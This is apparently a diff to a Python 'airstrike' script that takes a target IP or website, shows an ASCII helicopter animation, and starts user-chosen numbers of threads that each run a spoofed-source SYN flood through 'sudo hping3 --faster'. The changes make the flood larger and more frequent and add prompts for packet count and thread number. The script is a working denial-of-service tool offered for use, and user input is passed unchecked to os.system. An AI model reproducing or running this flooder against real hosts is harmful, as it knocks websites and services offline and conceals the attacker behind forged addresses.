@@ -10,6 +10,8 @@ def handler(signum, frame):
 	exit()
 signal.signal(signal.SIGINT, handler)
 ip = input("IP (or website): ")
+firepower = input("TNT power in pounds: ")
+miss = input("Helicopters with bombs to send: ")
 i = 0
 synthesizer = pyttsx3.init()
 synthesizer.say("Airstrike launched onto " + str(ip)) 
@@ -28,7 +30,7 @@ def test6():
  
  
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #1
 		os.system("clear")
 		print("""
      -----|-----
@@ -40,7 +42,7 @@ _______/-----------""")
  
  
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #2
 		os.system("clear")
 		print("""
        -----|-----
@@ -52,7 +54,7 @@ _______/-----------""")
  
                    
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #3
 		os.system("clear")
 		print("""
          -----|----
@@ -64,7 +66,7 @@ _______/-----------""")
  
                    
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #4
 		os.system("clear")
 		print("""
            -----|--
@@ -76,7 +78,7 @@ _______/-----------""")
           |
                    
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #5
 		os.system("clear")
 		print("""
              -----|
@@ -88,7 +90,7 @@ _______/-----------""")
           
           |         
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #6
 		os.system("clear")
 		print("""
                ----
@@ -100,7 +102,7 @@ _______/-----------""")
           
                    
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #7
 		os.system("clear")
 		print("""
                  --
@@ -112,7 +114,7 @@ _______/-----------""")
           
                    
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #8 
 		os.system("clear")
 		print("""
                    
@@ -124,7 +126,7 @@ _______/-----------""")
           
                    
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #9
 		os.system("clear")
 		print("""
                    
@@ -136,7 +138,13 @@ _______/-----------""")
           
                    
 _______/-----------""")
-		time.sleep(0.5)
+		time.sleep(0.5) #10
+		a = random.randrange(1, 255)
+		b = random.randrange(1, 255)
+		c = random.randrange(1, 255)
+		d = random.randrange(1, 255)
+		spoofed = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
+		os.system("sudo hping3 -S " + ip + " -a " + spoofed + " -c " + firepower + " -q --faster >/dev/null 2>&1")
 		os.system("clear")
 		print("""
                    
@@ -198,23 +206,20 @@ _______/-----------""")
 _______/-----------""")
 		time.sleep(6)
 		os.system("clear") 
-		a = random.randrange(1, 255)
-		b = random.randrange(1, 255)
-		c = random.randrange(1, 255)
-		d = random.randrange(1, 255)
-		spoofed = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
-		os.system("sudo hping3 -S " + ip + " -a " + spoofed + " -c 100 --faster -q >/dev/null 2>&1")
+
+
 
 def test1():
 	while True:
-		time.sleep(15)
+		time.sleep(5)
 		a = random.randrange(1, 255)
 		b = random.randrange(1, 255)
 		c = random.randrange(1, 255)
 		d = random.randrange(1, 255)
 		spoofed = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
-		os.system("sudo hping3 -S " + ip + " -a " + spoofed + " -c 100 -q --faster >/dev/null 2>&1")
-while i < 300:
+		os.system("sudo hping3 -S " + ip + " -a " + spoofed + " -c " + firepower + " -q --faster >/dev/null 2>&1")
+		time.sleep(10)
+while i < int(miss):
 	i = i + 1		
 	Thread(target = test1).start() 
 Thread(target = test6).start() 
